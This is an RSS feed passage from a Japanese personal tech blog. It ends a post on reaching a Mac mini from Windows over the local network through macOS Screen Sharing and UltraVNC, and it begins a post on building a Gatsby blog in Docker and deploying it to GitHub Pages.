      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/85c82b1fc74c3df19844d24b22aff21e/44a54/image-20220228223342401.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 70.41666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAACbUlEQVQ4y5WSaU8TURhGZ5pOKZRCp9PSGUohXSiBlqVsXVgFGsAoFQW/QNCQgMZdCEjSyFagKCKgyN893rJo1NaED0+edzI35547d6QhY43xhnWmmt+RDr7nftMqD8Nijn4lFTol6f9CX/CE/sAZnfohXXpe9AGdxh4drmPaHRd0u37Q572g13OEFKtcImqfIlhfg7fei1evxfB40D0Ghph1j46vzkcoGKLWMK7jRTc0gu5h4uo5cU1sVpUnVrWF1GV/Tsg2gSRJt46mtDKofSPhPKTbsSOyidRuWyRQnr5eJP8H8PudLJkuu6asnWHXdxLqPr0C2FstgJGKeRrKhkuCZFkuCfcI4IjrjJSaIynSUy2OHLbO4LMM3vK4V0Dd2sGY+5h+dZeUY18At5H8ZVMYlkRJs2w2SyQS+cv2qg1rG5PuPMPOnIDmiBcMA2UZdEu8pE0ymUTTtKKGdeURMp48o9oeQ+qOsPyIVGcZo0bpLgqz2+1Fv6V8DayviDJjHDLh2mXUuc2AI4ukW/pRlZaShiaT6Z/bv7llvy3KvPeAjHuLSW2TO+oGkmEZKA6UC1ZXffP8xyy6qSLCSu0RT9w5Zp1b3HUUgEo/mjmKSTZjkkRkRfTfv4ryy1IWa6ySFUXMMXMfK5UnLFpzzFduM139AcmltOEyt+M0t6AWYmqk2h6jJ/WYdGeaVHyOhppeEi3jJOML9DRNMxB5yUggy5y+wRvfZ163HjGrr/LAvo6kKo1cxhzGqTSjyWE05yhTC3leLCwz93SfpoY+Ho0tMTt/QnpomeTIBgNd5yx637KR+sRa5pR7/mekba/4CSjrfxEjUmocAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/85c82b1fc74c3df19844d24b22aff21e/8ac56/image-20220228223342401.webp 240w,
/static/85c82b1fc74c3df19844d24b22aff21e/d3be9/image-20220228223342401.webp 480w,
/static/85c82b1fc74c3df19844d24b22aff21e/e46b2/image-20220228223342401.webp 960w,
/static/85c82b1fc74c3df19844d24b22aff21e/11ae3/image-20220228223342401.webp 1017w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/85c82b1fc74c3df19844d24b22aff21e/8ff5a/image-20220228223342401.png 240w,
/static/85c82b1fc74c3df19844d24b22aff21e/e85cb/image-20220228223342401.png 480w,
/static/85c82b1fc74c3df19844d24b22aff21e/d9199/image-20220228223342401.png 960w,
/static/85c82b1fc74c3df19844d24b22aff21e/44a54/image-20220228223342401.png 1017w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/85c82b1fc74c3df19844d24b22aff21e/d9199/image-20220228223342401.png&quot;
            alt=&quot;image-20220228223342401&quot;
            title=&quot;image-20220228223342401&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;vncを使ってwindowsマシンからローカルネットワーク経由でリモートアクセスする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#vnc%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%A6windows%E3%83%9E%E3%82%B7%E3%83%B3%E3%81%8B%E3%82%89%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%AB%E3%83%8D%E3%83%83%E3%83%88%E3%83%AF%E3%83%BC%E3%82%AF%E7%B5%8C%E7%94%B1%E3%81%A7%E3%83%AA%E3%83%A2%E3%83%BC%E3%83%88%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9%E3%81%99%E3%82%8B&quot; aria-label=&quot;vncを使ってwindowsマシンからローカルネットワーク経由でリモートアクセスする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;VNCを使ってWindowsマシンからローカルネットワーク経由でリモートアクセスする&lt;/h2&gt;
&lt;p&gt;MacOSのシステム環境設定から「共有」をクリックします。&lt;/p&gt;
&lt;p&gt;ここで、「画面共有」を有効化して、「アクセスを許可」欄に表示されているユーザ&lt;code class=&quot;language-text&quot;&gt;Administors&lt;/code&gt;をダブルクリックして接続用のパスワードを設定します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 686px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/7b5639362f47c667b74b394ff608321d/f6386/image-20220302232446577.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 81.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAAC2UlEQVQ4y12T647aMBCFeYBK1V65h9wTx879CgEWWGApbaVKVf9Uff/XOB07wG7745Mdg2fOnBn3NrM/OGd7tOKEmh1R+XvM+Qn7+idWyTfk7g6l/4rCu0B7eTbPD9isz1jO39DWR7TzA9r0O3q5VqMUHMIPwVyhEH6MLCogWAzPDsAcDt/+gBWA8xBxliKMY4goQpgQQYGecx9BnzBwO0PkFdBHDh4+9zF61OAb8YUIzIz/wZtF8PXrGsEc+TAeOXruYwJj7MAc+9CHLgVOUKULjJ4ncA2GTNR0Rkq8HMLNIBzau7laJZlo8OvHb/othf4UoBf0C1ik0BhSBsriaIKyhjAmtDe5Uu3pIVw6k0rcmYA1ZurOFUfjRABvkqInhhXiNEfbbNBWG1IlPaLLdoSyXmG/+oJltYOl+ejfj6CPbaS8RsIqhUwYWAnZQKVPM/TYsEDWFFivdjhsTyjThpqRgDsxFvmGuvmCOlmSzzY+f7oH92Ks61c02RorWg8vZ+yWb8QRXC/Jw36mojMyPw/nyq/xg6FK6UoVcKUNWqiUyLLluT3lyMm/1/VJBT1uzwjNmgIOyGgvRRpUqNMlyrhVQWzyRF5oyy2aYoW2JUtI8aLY3DyViZSfhGyqKtkdpAjsWPnSZCusGxreaKGMluOiLhsCVbNQlpwOX7Fud8hj8lAUSMOyg+aW60UX0DMFmZuTugUyCmxPu+6pgEaogkoSXiKh4U1FBUaNc3WumniFadRlRyp0Ov/m+VoFlbNo0dhcFcpVljS4m2HyZCm0voPZgOhfoL0/STqFlsYuryFSyuSA29NAnUmkXzErlSUyQTd3/zGTCi8e2tr7kMpAEpf+cC1VXkioactqe3l27zZ8/I9SaDwJehWuKskcewrjhktvu0Mb2Jg8m7fvKwYxGzpg1FhfkwHvYvKADp89hX6DniJhDwM4I35DfluSgYQpzD5ZpsXgoxJ/Adgs3a3eKj14AAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/7b5639362f47c667b74b394ff608321d/8ac56/image-20220302232446577.webp 240w,
/static/7b5639362f47c667b74b394ff608321d/d3be9/image-20220302232446577.webp 480w,
/static/7b5639362f47c667b74b394ff608321d/7dbce/image-20220302232446577.webp 686w&quot;
              sizes=&quot;(max-width: 686px) 100vw, 686px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/7b5639362f47c667b74b394ff608321d/8ff5a/image-20220302232446577.png 240w,
/static/7b5639362f47c667b74b394ff608321d/e85cb/image-20220302232446577.png 480w,
/static/7b5639362f47c667b74b394ff608321d/f6386/image-20220302232446577.png 686w&quot;
            sizes=&quot;(max-width: 686px) 100vw, 686px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/7b5639362f47c667b74b394ff608321d/f6386/image-20220302232446577.png&quot;
            alt=&quot;image-20220302232446577&quot;
            title=&quot;image-20220302232446577&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;MacOS側の設定はこれで完了です。&lt;/p&gt;
&lt;p&gt;続いて、クライアント側のWindowsマシンに&lt;a href=&quot;https://uvnc.com/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;UltraVNC&lt;/a&gt;をインストールします。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://uvnc.com/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Home - UltraVNC VNC OFFICIAL SITE, Remote Desktop Free Opensource&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;上記リンク先からダウンロードしたインストーラを実行するだけです。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://uvnc.com/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;UltraVNC&lt;/a&gt;のインストールが完了したら、アクセス先に&lt;code class=&quot;language-text&quot;&gt;&amp;lt;MacOSのコンピュータ名&gt;.LOCAL&lt;/code&gt;を指定してリモートアクセスできます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 386px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/2e44ac270daa9e556d3440060985841d/7bc0b/image-20220302232841563.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 142.08333333333331%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAcCAYAAABh2p9gAAAACXBIWXMAAAsTAAALEwEAmpwYAAAFG0lEQVRIx21WyXLbRhTkl+k3fPJn5JCjj8kth1TlkJxcdlUsVyJbjuPIkq1dtGTJ3BcAxEZwEQkQJEFC3Dv9hiDtg6fqFQbE4E2/fj0Npj5ffYBrGqhpJZhGGbZZhefUYHFedwy0Gw7DVtHyLDTrFlrq3tmG/O532jjYf45U3TYQz6eIJw+YzeaYTKZYrYDZfIHNWCXx7Vjyh1USi8VS/XZzcYTU57tzPP7jMX5+/RPiKEY0inD7+QbPnz/D4eEhnj19ihe7L3H88Qi7uy8438XF1RX6/T6CwGcE8LtdxA9THB+8Qiqb+YQfn/2A397+ilF/pBY2Gw1c8aWzszPc3t7CsizU6y4MQ0e5XOG8jl4vVMkkut0OxvEDTg/3kSrmbuHWGtBKOqrVKgaDITzPw6NHj7Czs4MnT57Aq3tottosb4XlcklqZqRmso0Rq4pGMRO+RqpS/IJoPELQCxCG4Ta6LKPT6eD+/l7Nfd9XIfcS8mwTrVZLJTzZJByPx0TWx3A4RBRFqgzTNIm0gS6TNJstOLaj7sOwr2gZDAZqvUSfAKZs6Mn7V+uEfi8iLx4aLFVeanLHQqEIraoxWZPJbeRzeeiGkTQjQJtrGuRanstVIXyfIHSbPsoVDRUSXmQir9FEHI+5+2CLRJArNEwoJUsF19fXOD+/YKPK6IWDpOSClEy5REOVYPOSoJBkMu/1eiqE281zmct1Pe/hYTLDx4M9pHJ3adi2jcvLNLusqVKE/HKphJPjUxR5FeLlt1w2q1Dl8wUlla7fhaZVkU6nSdM93u3/KQjvlCR0Xd8iEU40TaP+7ERnXSUl07RQrVTRIG/yu+vWFRjZ3A9CHL37CymtlMF9J0COpMtD4cd1XaVJhy9Id/P5PC4vLin2NNKfrtUGwqnj1HH96QaZLxlMZos1h9XiHUvyFcJsNqdQhDwFUqLNZLpuKHQeUXvcyO/cU8gjnt+5Or+BH7DDIzVXCY1Klqi6CpFpOarkdrvN3R3UKaH54qtJxMzRn6ywWi7UiQm5Vhoa8lDIODt6g5SlF9RNmzy2SGx/09kw3PLX4jNpluk2UbU8ovKxYMIN52IOMtKHFLal5dWNIMpm87BYspRdM2pErcN1XEolUi8OuEmPne33B/jeyH/4WxKuEUpni8WKEqwkk2uOnIq7iGFIEuFWOJO5IBSzUIaR8OkcU4d2UrKIWCRRoRal2zIvFErKugS9yU3WDWrQ+x6+mq8kTXiuf9xbc7ig/YpBiMepZtDvBLHIRzosVznXLTZr4zqtVhMjvqPcO0HoSclmNUe9eeqUCDI5z6I9TdPVubbJoWwgmgzZrO+O5Rph4wMR1qpZWLbLZtgKncHSBGm300WdyOJ4Xd58Plf6G9M75Soh4hY7m9JkVcmHRFijDmuqsyaR2SiVynx5oboq5ItPyr2UXeAZtslpqVhWc5GTeGVMLcqwDpKSPa/Jci2iM5RkZKE0IwjWIt+Yg2wyTHQ64GabL+EqKdn4TxAyoUtzFf0ZPH46udNZtvAoZU6nU2VZMqRMEXsv6KmkImjR6CZh5d8kYRSN1O5yAjaL5FjJB2hFvckxW1AaYvXyXEI0GXHd5BsJFd/SbUy9hNlipT6D8m19YKzn/JqRm6GYL+URxTHG3CAmYokWXalMZVRYVYZO5dCxMvsvkUqfvIXJvyFiY3o5uw2NUStl4RYyMPM51HJZGFmJDIxMBl/OTnG09wqn/7zB6f4e8jdXuPj9F/wPz70HbvXate8AAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/2e44ac270daa9e556d3440060985841d/8ac56/image-20220302232841563.webp 240w,
/static/2e44ac270daa9e556d3440060985841d/23cef/image-20220302232841563.webp 386w&quot;
              sizes=&quot;(max-width: 386px) 100vw, 386px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/2e44ac270daa9e556d3440060985841d/8ff5a/image-20220302232841563.png 240w,
/static/2e44ac270daa9e556d3440060985841d/7bc0b/image-20220302232841563.png 386w&quot;
            sizes=&quot;(max-width: 386px) 100vw, 386px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/2e44ac270daa9e556d3440060985841d/7bc0b/image-20220302232841563.png&quot;
            alt=&quot;image-20220302232841563&quot;
            title=&quot;image-20220302232841563&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;細かいオプションの設定についてはデフォルトのままでもつながるはずです。&lt;/p&gt;
&lt;p&gt;日本語配列キーボードを使っているのであれば「Mouse and Keyboard」の設定タブから「Japanese Keyboard」の設定は有効化しておいた方がよさそうな気がします。&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;新しくMac端末を買ったので仮想マシンのセットアップまでやってみました。&lt;/p&gt;
&lt;p&gt;本当はESXiを入れたかったのですが、どうやらMac miniの内臓SSDにESXiをインストールすることはできず、Thunderbolt 3で接続した外部SSDにインストールする必要があることがわかったので、今回はFusion Playerで代用しました。&lt;/p&gt;
&lt;p&gt;また外部接続用のSSDが手に入ったらESXiの構築にもチャレンジしていこうと思います。&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Gatsbyで作成したSPAブログをGitHubPagesに公開する環境を作る備忘録]]></title><description><![CDATA[Gatsbyで作成したSPAブログをGithub Pagesに公開する手順についてまとめています。Gatsbyの開発環境はDockerコンテナ上に構築しています。]]></description><link>https://kashiwaba-yuki.com/note-how-to-deploy-gatsby-spa</link><guid isPermaLink="false">https://kashiwaba-yuki.com/note-how-to-deploy-gatsby-spa</guid><pubDate>Sun, 20 Feb 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;突然ですが、諸般の事情につきブログを移転することにしました。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://yukituna.com/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;旧ブログ&lt;/a&gt;の記事は順次こちらのブログに移植していこうと思います（手動でやる必要があるので面倒ですが…。）&lt;/p&gt;
&lt;p&gt;新しいブログですが、MITライセンスで公開されているGatsbyテンプレートの&lt;a href=&quot;https://github.com/alxshelepenok/gatsby-starter-lumen&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;gatsby-starter-lumen&lt;/a&gt;をベースに使用させてもらってます。&lt;/p&gt;
&lt;p&gt;この記事では、新しいブログを公開するまでに実施した作業について備忘録としてまとめておきます。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E4%BB%8A%E5%9B%9E%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8B%E7%92%B0%E5%A2%83&quot;&gt;今回作成する環境&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%AB%E9%96%8B%E7%99%BA%E7%92%B0%E5%A2%83&quot;&gt;ローカル開発環境&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%87%E3%83%97%E3%83%AD%E3%82%A4%E7%92%B0%E5%A2%83&quot;&gt;デプロイ環境&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#gatsby%E7%92%B0%E5%A2%83%E3%82%92%E6%A7%8B%E7%AF%89%E3%81%99%E3%82%8B&quot;&gt;Gatsby環境を構築する&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#docker%E3%82%92%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B&quot;&gt;Dockerをインストールする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#gatsby%E9%96%8B%E7%99%BA%E7%94%A8%E3%81%AE%E3%82%B3%E3%83%B3%E3%83%86%E3%83%8A%E3%82%92%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8B&quot;&gt;Gatsby開発用のコンテナを作成する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#gatsby%E3%83%96%E3%83%AD%E3%82%B0%E3%81%AE%E4%BD%9C%E6%88%90&quot;&gt;Gatsbyブログの作成&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%88%E3%83%A9%E3%83%96%E3%83%AB%E3%82%B7%E3%83%A5%E3%83%BC%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0eacces-permission-denied-mkdir-appnpmsentry-cli-%E3%81%8C%E7%99%BA%E7%94%9F%E3%81%99%E3%82%8B%E5%A0%B4%E5%90%88&quot;&gt;トラブルシューティング：EACCES: permission denied, mkdir ‘/app/.npm/sentry-cli’ が発生する場合&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%88%E3%83%A9%E3%83%96%E3%83%AB%E3%82%B7%E3%83%A5%E3%83%BC%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0socialimage%E3%81%AE%E3%82%A8%E3%83%A9%E3%83%BC%E3%81%8C%E7%99%BA%E7%94%9F%E3%81%99%E3%82%8B%E5%A0%B4%E5%90%88&quot;&gt;トラブルシューティング：socialImageのエラーが発生する場合&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#gatsby%E3%81%AE%E8%A8%AD%E5%AE%9A%E3%82%92%E5%A4%89%E6%9B%B4%E3%81%99%E3%82%8B&quot;&gt;Gatsbyの設定を変更する&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%97%E3%83%AD%E3%83%95%E3%82%A3%E3%83%BC%E3%83%AB%E8%A8%AD%E5%AE%9A%E3%82%92%E5%A4%89%E6%9B%B4%E3%81%99%E3%82%8B&quot;&gt;プロフィール設定を変更する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%B5%E3%82%A4%E3%83%88%E3%83%87%E3%82%B6%E3%82%A4%E3%83%B3%E3%81%AE%E8%A8%AD%E5%AE%9A&quot;&gt;サイトデザインの設定&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%B3%E3%83%B3%E3%83%86%E3%83%B3%E3%83%84%E3%82%92%E8%BF%BD%E5%8A%A0%E7%B7%A8%E9%9B%86%E3%81%99%E3%82%8B&quot;&gt;コンテンツを追加、編集する&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#typora%E3%81%AE%E8%A8%AD%E5%AE%9A%E3%82%92%E3%81%99%E3%82%8B&quot;&gt;Typoraの設定をする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#github-pages%E3%81%AB%E3%83%87%E3%83%97%E3%83%AD%E3%82%A4%E3%81%99%E3%82%8B&quot;&gt;GitHub Pagesにデプロイする&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%91%E3%82%B9%E3%81%AE%E8%A8%AD%E5%AE%9A&quot;&gt;パスの設定&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%87%E3%83%97%E3%83%AD%E3%82%A4%E7%94%A8%E3%81%AE%E3%82%AB%E3%82%B9%E3%82%BF%E3%83%A0%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%88%E3%81%AE%E4%BD%9C%E6%88%90&quot;&gt;デプロイ用のカスタムスクリプトの作成&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#pages%E3%81%AE%E8%A8%AD%E5%AE%9A&quot;&gt;Pagesの設定&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;今回作成する環境&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E4%BB%8A%E5%9B%9E%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8B%E7%92%B0%E5%A2%83&quot; aria-label=&quot;今回作成する環境 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;今回作成する環境&lt;/h2&gt;
&lt;p&gt;今回は以下の環境を想定しています。&lt;/p&gt;
&lt;h3 id=&quot;ローカル開発環境&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%AB%E9%96%8B%E7%99%BA%E7%92%B0%E5%A2%83&quot; aria-label=&quot;ローカル開発環境 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ローカル開発環境&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Windows 10 Pro&lt;/li&gt;
&lt;li&gt;Docker&lt;/li&gt;
&lt;li&gt;Typora&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;この環境が実際に記事を書く環境になります。&lt;/p&gt;
&lt;p&gt;Windowsホスト上のTyporaでMarkdownを編集し、動作確認はGatsby環境を構築したDockerコンテナ上で行います。&lt;/p&gt;
&lt;p&gt;ちなみにTyporaは高機能Markdownエディタです。&lt;/p&gt;
&lt;p&gt;最近有料化しましたが$15くらいの買い切りライセンスなので非常におすすめです。&lt;/p&gt;
